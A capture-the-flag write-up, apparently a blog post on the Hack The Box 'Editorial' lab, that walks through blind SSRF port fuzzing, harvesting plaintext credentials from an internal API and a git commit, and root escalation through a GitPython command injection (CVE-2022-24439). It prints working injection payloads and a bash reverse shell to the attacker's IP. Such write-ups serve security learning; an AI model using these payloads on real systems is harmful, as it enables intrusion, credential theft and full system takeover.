---
layout: post
title:  HTB Editorial Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-12 22:00:00 +0300
image:  '/images/htb_editorial.png'
tags:   [Write-ups, HTB, OSCP+, Linux, Easy, Blind-SSRF, Fuzzing, API, Git, Git-Commit, Python-Script, CVE, Command-Injection]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration](#web-enumeration)
  - [Detecting Blind SSRF Vulnerability](#detecting-blind-ssrf-vulnerability)
- [Foothold](#foothold)
  - [Fuzzing all ports on target 127.0.0.1 IP to find local port 5000 with API Endpoints](#fuzzing-all-ports-on-target-127001-ip-to-find-local-port-5000-with-api-endpoints)
  - [Enumerating API Endpoints](#enumerating-api-endpoints)
  - [SSH access as user dev](#ssh-access-as-user-dev)
- [Privilege Escalation](#privilege-escalation)
  - [Finding user prod credentials on Git Commit](#finding-user-prod-credentials-on-git-commit)
  - [Using sudo -l to find out we can run a python script with sudo](#using-sudo--l-to-find-out-we-can-run-a-python-script-with-sudo)
  - [CVE-2022-24439 - Abusing Command Injection vulnerability inside python script to exfiltrate the contents of root.txt](#cve-2022-24439---abusing-command-injection-vulnerability-inside-python-script-to-exfiltrate-the-contents-of-roottxt)
  - [CVE-2022-24439 - Abusing Command Injection vulnerability inside python script to trigger a bash script with a reverse shell and get a shell as root](#cve-2022-24439---abusing-command-injection-vulnerability-inside-python-script-to-trigger-a-bash-script-with-a-reverse-shell-and-get-a-shell-as-root)

# Enumeration
### Nmap

```shell
# Step 1 - Find active ports
sudo nmap -p- -Pn --min-rate 10000 10.129.138.51

# Step 2 - Focus scan on the active ports found
sudo nmap -A -T4 -Pn -p22.80 10.129.138.51
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-12 14:48 EST
Nmap scan report for 10.129.138.51
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 (99%), Linux 4.15 - 5.8 (95%), Linux 5.0 - 5.4 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), HP P2000 G3 NAS device (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   33.94 ms 10.10.14.1
2   34.00 ms 10.129.138.51

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.73 seconds
```

We found the SSH port 22 and HTTP port 80 containing a domain open.

Lets add the domain to /etc/hosts:

```shell
echo "10.129.138.51 editorial.htb" | sudo tee -a /etc/hosts
```

### Web Enumeration
Lets visit the website using the domain we just added:

```shell
http://editorial.htb/
```

It seems like a book editorial website.

Clicking around and further enumerating the website we found an upload form.

Click on Publish with us to access the following URL:

```shell
http://editorial.htb/upload
```

On Book information it says Cover URL related to your book or.

### Detecting Blind SSRF Vulnerability

Cover URL related to your book or.. maybe our Kali IP? Lets test if we can get a response using a nc listener:

```shell
# Start nc listener on Kali
nc -lvnp 8443

# We can also use a python3 server to receive a response
python3 -m http.server 8443
```

Now enter our Kali tun0 IP and the port of our nc listener on the Cover URL input field:

```shell
http://10.10.14.206:8443/
```

And click on Preview now and check our nc listener:

```
listening on [any] 8443 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.138.51] 57916
GET / HTTP/1.1
Host: 10.10.14.206:8443
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

It worked! This means that there is a Blind SSRF.

Note: If we fill everything and get Send book info, we wont get any response. Only clicking on Preview give us a response.

# Foothold
### Fuzzing all ports on target 127.0.0.1 IP to find local port 5000 with API Endpoints

Lets try to enumerate all ports using the 127.0.0.1 IP to see if there are any extra locally open ports at the target.

To do this, we will create a list containing all port numbers from 1 to 65535 first:

```shell
# Using the seq command is an easy way to achieve this
seq 0 65535 > 1_to_65535.txt
```

Now we can use Burp Suite or OWASP ZAP.

Enter the following IP and click on Preview, while capturing the request on Burp Suite or OWASP ZAP (Use FoxyProxy on Firefox for this):

```shell
http://127.0.0.1:10000/
```

The captured POST request will look like this:

```shell
POST http://editorial.htb/upload-cover HTTP/1.1
host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: multipart/form-data; boundary=---------------------------155062683613212044802935180338
Content-Length: 366
Origin: http://editorial.htb
Connection: keep-alive
Referer: http://editorial.htb/upload

-----------------------------155062683613212044802935180338

Content-Disposition: form-data; name="bookurl"



http://127.0.0.1:10000/

-----------------------------155062683613212044802935180338

Content-Disposition: form-data; name="bookfile"; filename=""

Content-Type: application/octet-stream





-----------------------------155062683613212044802935180338--
```

On OWASP ZAP, do right-click on the POST request containing http://127.0.0.1:10000, then select Attack -> Fuzz.

Then mark the 10000 from IP on the request and click on Add.... A new window will open, click Add... again. We can now select File -> 1_to_65535.txt. Or use Numberzz from 1 to 65535 with an increment of 1. Whatever you use, we can click on Start Fuzzer.

When the fuzzing finishes, filter the results by "Size Resp. Body". We will notice that all responses have 61 bytes, but there is one response with 51 bytes on the task ID 5000. This means that there is something at the local port 5000. This particular response request contained the following:

```shell
static/uploads/430f49a3-c6e0-4636-ad08-f473caec672d
```

I will start Burp Suite, enter the following URL on the Book Cover URL and click on Preview, capture the request and send it to Repeater, then click on Send and see the Response:

```shell
# Enter this URL on the Book Cover URL before clicking on Preview
http://127.0.0.1:5000
```

The Request will look like this:

```shell
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------311619798941078819431941106191
Content-Length: 365
Origin: http://editorial.htb
Connection: keep-alive
Referer: http://editorial.htb/upload


-----------------------------311619798941078819431941106191
Content-Disposition: form-data; name="bookurl"


http://127.0.0.1:5000/
-----------------------------311619798941078819431941106191
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream




-----------------------------311619798941078819431941106191--
```

And the response to this request will look like this:

```shell
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 12 Nov 2024 20:23:25 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Content-Length: 51


static/uploads/612af631-d63c-4e5c-9ccc-8dc36787eafe
```

It seems like the file value is always changing. Be fast, use Repeater and right after seeing the response, go straight to the URL:

```shell
http://editorial.htb/static/uploads/612af631-d63c-4e5c-9ccc-8dc36787eafe
```

If you are not fast enough, click Send on Repeater again and visit the URL as fast as possible to download the file.

Once we managed to download the file, lets inspect it:

```shell
cat 612af631-d63c-4e5c-9ccc-8dc36787eafe | jq
```

```shell
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

This looks like API endpoints.

### Enumerating API Endpoints

Now we can try to check if we can get anything interesting from the metadata endpoints.

Note: I repeated the following process with all endpoints, but the one that gave us credentials was the /apt/latest/metadata/messages/authors. 

Lets visit it and see what we can get. 

Enter the following on the Book Cover URL, capture the request and examine the response on Burp Suite:

```shell
http://127.0.0.1:5000/api/latest/metadata/messages/authors
```

The response will look like this:

```shell
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 12 Nov 2024 20:30:56 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Content-Length: 51


static/uploads/b7f9ebc5-74b1-4c6c-abf6-c7d83934b2e3
```

Now we need to be fast and access the following URL:

```shell
http://editorial.htb/static/uploads/b7f9ebc5-74b1-4c6c-abf6-c7d83934b2e3
```

This allowed us to download the following file:

```shell
cat b7f9ebc5-74b1-4c6c-abf6-c7d83934b2e3 | jq
```

```shell
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```

Nice! Now we got some credentials:

```shell
# Username
dev

# Password
dev080217_devAPI!@
```

### SSH access as user dev

Now we can use these credentials to try to get SSH access:

```shell
ssh dev@10.129.138.51
# dev@10.129.138.51's password: dev080217_devAPI!@
```

The credentials were valid, we are in!

### User Flag
Now we can get the user.txt flag:

```shell
cat /home/dev/user.txt
```

# Privilege Escalation
### Finding user prod credentials on Git Commit 
Enumerating the files we found a .git directory inside /apps:

```shell
dev@editorial:~/apps$ ls -al
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
drwxr-x--- 4 dev dev 4096 Jun  5 14:36 ..
drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git
```

Lets check the git log:

```shell
# Move inside .git
cd .git

# Check the git log with this command
git log
```

```shell
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500
```

Exit with :q.

Here we can see multiple commits as a result. If we enumerate and check their contents, we will find credentials in the following one:

```shell
git show 1e84a036b2f33c59e2390730699a488c65643d28 
```

```shell
<SNIP>
+@app.route(api_route + '/authors/message', methods=['GET'])
+def api_mail_new_authors():
+    return jsonify({
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+    }) # TODO: replace dev credentials when checks pass
+
+# -------------------------------
+# Start program
+# -------------------------------
<SNIP>
```

Exit with :q.

From this git commit we got the following credentials:

```shell
# Username
prod

# Password
080217_Producti0n_2023!@
```

Now we can change our user to prod:

```shell
# Change user to prod using su
su prod
# Password: 080217_Producti0n_2023!@
```

### Using sudo -l to find out we can run a python script with sudo
Lets use sudo -l and see what we get:

```shell
prod@editorial:~$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

It seems like we can run the clone_prod_change.py with sudo.

Lets check the contents of the script:

```shell
prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

It seem like this script accepts an URL as a command line and uses git to clone a repository.

### CVE-2022-24439 - Abusing Command Injection vulnerability inside python script to exfiltrate the contents of root.txt

We we will use % to abuse command injection inside this script. These symbols in the command are URL-encoded spaces,, which are known to work on some command injection vulnerabilities, like in this case.

We can abuse this to exfiltrate the contents of root.txt. Lets first see if we can create a test file as root:

```shell
# Create the test file
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/test'

# Check if root created it
ls -al /tmp

# Results - root created it (This means root can access root.txt too)
-rw-r--r--  1 root root    0 Nov 12 21:00 test
```

Nice! Lets try to get the contents of root.txt now:

```shell
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root.txt'
```

```shell
cat /tmp/root.txt
```

It worked! Now we were able to read the contents of root.txt.

Searching for more information about this vulnerability, we found CVE-2022-24439:

https://nvd.nist.gov/vuln/detail/CVE-2022-24439

Which explains why this happened:

```shell
All versions of package gitpython are vulnerable to Remote Code Execution (RCE) due to improper user input validation, which makes it possible to inject a maliciously crafted remote URL into the clone command. Exploiting this vulnerability is possible because the library makes external calls to git without sufficient sanitization of input arguments.
```
### CVE-2022-24439 - Abusing Command Injection vulnerability inside python script to trigger a bash script with a reverse shell and get a shell as root 

We can also abuse the command injection vulnerability inside the python script to get a reverse shell making root read a bash script containing our reverse shell:

```shell
# Start nc listener
nc -lvnp 8443

# Create bash script containing our reverse shell
echo "bash -i >& /dev/tcp/10.10.14.206/8443 0>&1" > /tmp/shell.sh

# Run the script as follow to trigger the bash script with our reverse shell
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/shell.sh'
```

It worked! We got a shell as root:

```shell
listening on [any] 8443 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.138.51] 50228
root@editorial:/opt/internal_apps/clone_changes# whoami
whoami
root
```

### Root Flag
Now we can get the root.txt flag:

```shell
cat /root/root.txt
```